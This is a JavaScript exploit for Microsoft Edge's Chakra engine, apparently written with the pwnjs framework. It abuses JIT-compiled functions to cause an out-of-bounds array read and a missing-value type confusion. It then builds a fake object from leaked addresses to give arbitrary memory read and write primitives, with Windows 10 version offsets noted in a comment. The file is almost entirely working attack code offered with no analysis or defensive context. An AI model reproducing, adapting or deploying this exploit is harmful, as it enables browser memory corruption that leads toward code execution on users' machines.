// IsDetached offset changes between major versions of Edge.
// Windows 10 1607: 0x3C
// Windows 10 1703: 0x20
var Exploit = (function() {
    var ChakraExploit = pwnjs.ChakraExploit,
        Integer = pwnjs.Integer,
        getInt8 = DataView.prototype.getInt8,
        getInt16 = DataView.prototype.getInt16,
        getInt32 = DataView.prototype.getInt32,
        setInt8 = DataView.prototype.setInt8,
        setInt16 = DataView.prototype.setInt16,
        setInt32 = DataView.prototype.setInt32;

    function Exploit() {
        ChakraExploit.call(this);

        var array_addr;
        var fake_object = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        //var arr = [1.1, 2.2];
        var b = new Uint32Array(100);
		var ab = new ArrayBuffer(0x100);
        var f64 = new Float64Array(ab), i32 = new Int32Array(ab);
		
		missingvalue_fa = [1.1,2.2];
		function opt(arr,index) {
			if(arr.length < 0x80 )
				return;
			let s4 =0;
			let temp=0;
			for(var t=0;t<1;t++)
			{
				if(index===8)
					s4 += 0x80;
				s4 +=2;
				temp = arr[s4];
			}
			missingvalue_fa[0] = temp;
			return temp;
		}
		fa_oobr  =[1.1,2.2,3.3];

		for(let i=0;i<0x80;i++)
			fa_oobr[i] = i;
		for(let i=0;i<0x1000;i++)
		    opt(fa_oobr,2);
		opt(fa_oobr,8);

		function opt2(fa_mv, fa_tc,o_arr,fake_object){
			[].slice();
			fa_tc[1] = 2.2;
			let r = fa_tc.push(fa_mv[0]);
			o_arr[0] = fake_object;
			//fa_tc[2] = 6.17651672645e-312;

			f64[0] = fa_tc[0]
			var base_lo = i32[0],base_hi=i32[1];
			i32[0] = base_lo + 0x58;
			fa_tc[0] = f64[0];
			fake_object[0] = 0;
			fake_object[1] = 0;
			fake_object[2] = base_lo + 0x68;
			fake_object[3] = base_hi;
			fake_object[4] = 56;
			fake_object[5] = 0;
			fake_object[6] = base_lo + 0x58 - 0x430;
			fake_object[7] = base_hi;
			fake_object[8] = 0x200;
			fake_object[9] = 0;
			fake_object[10] = base_lo + 0x58 - 0x20;
			fake_object[11] =  base_hi;
			fake_object[14] = base_lo + 0x58;
			fake_object[15] = base_hi;

            array_addr = new Integer(base_lo, base_hi, true);
		}

		for(let i = 0;i < 0x10000;i++){
			let d_arr = [1.1,2.2,3.3];
			delete d_arr[1];
			let d_arr_no_mv = [1.1,2.2,3.3];
			let o_arr = [1.1,2.2,{},2.2];
			delete o_arr[1]
			opt2(d_arr_no_mv, d_arr,o_arr,fake_object);
		}
		fa_tc =[1.1,2.2,3.3];
        opt2( missingvalue_fa, fa_tc,fa_tc,fake_object );
		
		
        this.dv = fa_tc[0];
        this.fake_object = fake_object;
        this.initChakra(this.Uint64Ptr.cast(array_addr)[0]);
		
    }
    Exploit.prototype = Object.create(ChakraExploit.prototype);
    Exploit.prototype.constructor = Exploit;
    Exploit.prototype.read = function (address, size) {
        this.fake_object[14] = address.low | 0;
        this.fake_object[15] = address.high | 0;

        switch (size) {
            case 8: return new Integer(getInt8.call(this.dv, 0, true), 0, true);
            case 16: return new Integer(getInt16.call(this.dv, 0, true), 0, true);
            case 32: return new Integer(getInt32.call(this.dv, 0, true), 0, true);
            case 64: return new Integer(getInt32.call(this.dv, 0, true), getInt32.call(this.dv, 4, true), true);
        }
    }
    Exploit.prototype.write = function (address, value, size) {
        this.fake_object[14] = address.low | 0;
        this.fake_object[15] = address.high | 0;

        switch (size) {
            case 8: return setInt8.call(this.dv, 0, value.low|0, true);
            case 16: return setInt16.call(this.dv, 0, value.low|0, true);
            case 32: return setInt32.call(this.dv, 0, value.low|0, true);
            case 64:
                setInt32.call(this.dv, 0, value.low|0, true);
                setInt32.call(this.dv, 4, value.high|0, true);
        }
    }
    return Exploit;
})();